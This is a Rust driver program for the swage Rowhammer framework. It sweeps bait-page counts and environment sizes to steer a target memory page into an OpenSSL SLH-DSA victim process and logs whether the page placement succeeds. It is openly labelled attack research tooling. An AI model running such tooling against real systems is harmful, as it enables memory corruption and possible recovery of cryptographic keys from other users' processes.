use std::ptr::null_mut;

use anyhow::bail;
use clap::{Parser, arg};
use indicatif::MultiProgress;
use log::{error, info, warn};

use swage::allocator::ConsecAllocator;
use swage::allocator::Pfn;
use swage::allocator::Spoiler;
use swage::blacksmith::BlacksmithConfig;
use swage::blacksmith::FromBlacksmithConfig;
use swage::memory::{BytePointer, ConsecBlocks, MemConfiguration, Memory};
use swage::util::alloc_util::mmap;
use swage::util::{PAGE_SIZE, Size::KB, Size::MB};
use swage::victim::{HammerVictimError, InjectionConfig, VictimOrchestrator};
use swage_victim_ossl_slh_dsa::OsslSlhDsa;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<Option<usize>>,
    #[arg(short = 'b', long)]
    bait_before: Option<usize>,
    #[arg(short = 'a', long)]
    bait_after: Option<usize>,
    #[arg(long, default_value = "mmap")]
    alloc_strategy: AllocStrategy,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum AllocStrategy {
    Spoiler,
    Pfn,
    Mmap,
}

fn main() -> anyhow::Result<()> {
    env_logger::init();
    //const NUM_PAGES: usize = 1 << 21; // 8 GB
    //const ALLOC_SIZE: usize = NUM_PAGES * PAGE_SIZE;
    let args = CliArgs::parse();
    info!("CLI args: {:?}", args);
    let bs_config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&bs_config);
    //0..64 {
    //let bait_before = args.bait_before;
    let bait_before_range = args.bait_before.map(|b| b..b + 1).unwrap_or(0..30);
    let bait_after_range = args.bait_after.map(|b| b..b + 1).unwrap_or(0..30);
    let progress = MultiProgress::new();
    for env_length in (0..PAGE_SIZE).step_by(128) {
        for bait_after in bait_after_range.clone() {
            for bait_before in bait_before_range.clone() {
                println!(
                    "bait_after,bait_before,env_length: {},{},{}",
                    bait_after, bait_before, env_length
                );
                let env = vec![("A".repeat(env_length), "".into())];
                for _ in 0..args.repeat.unwrap_or(Some(1)).unwrap_or(2_usize.pow(32)) {
                    // allocate bait page, get PFN
                    let x = match args.alloc_strategy {
                        AllocStrategy::Spoiler => {
                            let mut spoiler = Spoiler::new(
                                mem_config,
                                bs_config.threshold.into(),
                                Some(progress.clone()),
                            );
                            spoiler.alloc_consec_blocks(MB(4))?
                        }
                        AllocStrategy::Pfn => {
                            let mut pfn = Pfn::new(mem_config, None.into());
                            match pfn.alloc_consec_blocks(MB(4)) {
                                Ok(blocks) => blocks,
                                Err(e) => bail!("Failed to allocate PFN blocks: {}", e),
                            }
                        }
                        AllocStrategy::Mmap => {
                            let x: *mut u8 = mmap(null_mut(), MB(4).bytes());
                            if x.is_null() {
                                bail!("Failed to allocate memory");
                            }
                            ConsecBlocks::new(vec![Memory::new(x, MB(4).bytes())])
                        }
                    };
                    let flippy_page =
                        unsafe { x.ptr().byte_add(KB(64).bytes() + 0x110) as *mut libc::c_void };

                    info!("Launching victim");
                    let mut victim = match OsslSlhDsa::new_with_config(
                        InjectionConfig {
                            id: usize::MAX,
                            target_addr: flippy_page as usize,
                            flippy_page_size: PAGE_SIZE,
                            bait_count_after: bait_after,
                            bait_count_before: bait_before,
                            stack_offset: usize::MAX,
                        },
                        env.clone(),
                    ) {
                        Ok(v) => v,
                        Err(e) => {
                            warn!("Error creating victim: {:?}", e);
                            println!("None");
                            continue;
                        }
                    };
                    let success = victim.start();
                    match success {
                        Err(HammerVictimError::FlippyPageNotFound) => {
                            println!("None");
                        }
                        Err(HammerVictimError::FlippyPageOffsetMismatch { actual, .. }) => {
                            println!("{:?}", actual);
                        }
                        Err(e) => {
                            error!("Error starting victim: {:?}", e);
                            println!("{:?}", e);
                        }
                        Ok(_) => {
                            println!("{}", usize::MAX);
                        }
                    }
                    victim.stop();
                    x.dealloc();
                }
            }
        }
    }
    Ok(())
}
